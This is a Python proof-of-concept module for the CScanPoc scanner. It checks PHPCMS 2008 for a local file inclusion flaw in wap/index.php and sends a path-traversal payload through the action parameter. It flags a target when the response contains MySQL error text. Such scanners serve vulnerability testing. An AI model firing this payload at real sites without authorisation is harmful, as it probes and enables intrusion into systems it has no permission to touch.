# coding: utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'PHPCMS_0111' # 平台漏洞编号
    name = 'PHPCMS2008本地文件包括及利用' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2010-10-12'  # 漏洞公布时间
    desc = '''
    文件wap/index.php
    action 变量没有判断，造成本地文件包含漏洞。
    利用（其中之一）：
    包含目录include\fields\areaid 下任一文件，即可执行任意SQL脚本。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=497
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPCMS'  # 漏洞组件名称
    product_version = '2008'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '463e48c5-5e34-4926-bf04-f71172a1e06b' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-11' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/wap/index.php?action=../../include/fields/areaid/field_add&tablename=xx"
            url = self.target + payload
            response = requests.get(url)
            if 'MySQL Query :' in response.text or "MySQL Error" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
